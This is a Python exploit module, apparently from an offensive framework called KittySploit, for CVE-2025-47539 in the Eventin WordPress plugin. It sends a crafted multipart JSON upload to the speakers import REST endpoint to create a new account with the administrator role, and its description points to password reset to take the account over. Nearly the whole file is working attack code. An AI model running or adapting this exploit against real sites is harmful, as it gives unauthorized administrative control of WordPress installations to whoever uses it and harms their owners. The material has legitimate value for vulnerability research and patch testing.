#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Eventin CVE-2025-47539 — import administrator via speakers REST API."""

import json
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Eventin CVE-2025-47539 speaker import privesc",
        "description": (
            "Imports a WordPress user with role=administrator through eventin/v2/speakers/import. "
            "Does not set a known password — use password reset or mailbox if applicable."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2025-47539"],
        "tags": ["wordpress", "eventin", "privesc", "auxiliary", "cve-2025-47539"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    email = OptString("", "Email for imported admin (auto if empty)", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        name = f"ks{secrets.token_hex(3)}"
        email = (self.email or "").strip() or f"{name}@example.test"
        boundary = "----KittySploitBoundary"
        payload = json.dumps(
            [
                {
                    "id": "999",
                    "name": name,
                    "email": email,
                    "role": "administrator",
                    "designation": "kittysploit",
                    "speaker_category": ["speaker"],
                    "social": [[]],
                }
            ]
        )
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="speaker_import"; filename="speakers.json"\r\n'
            f"Content-Type: application/json\r\n\r\n"
            f"{payload}\r\n"
            f"--{boundary}--\r\n"
        ).encode()
        r = self.http_request(
            method="POST",
            path=self._join("/wp-json/eventin/v2/speakers/import"),
            params={"_locale": "user"},
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            data=body,
            allow_redirects=False,
        )
        if r and r.status_code == 200 and "Successfully imported speaker" in (r.text or ""):
            print_success(f"Administrator import accepted for {email}")
            return True
        print_error("Import failed")
        return False
